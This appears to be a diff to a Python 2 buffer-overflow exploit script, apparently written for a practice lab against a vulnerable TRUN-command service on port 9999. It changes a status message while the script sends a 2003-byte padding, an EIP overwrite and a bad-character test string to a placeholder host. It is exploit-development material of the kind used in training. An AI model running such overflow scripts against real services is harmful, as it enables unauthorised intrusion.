@@ -25,7 +25,7 @@ badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 shellcode = "A" * 2003 + "B" * 4 + badchars
 
 try:
-    print "\nOverwriting EIP..."
+    print "\nLocating Bad Characters..."
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("x.x.x.x", 9999))
     s.send(('TRUN /.:/' + shellcode))
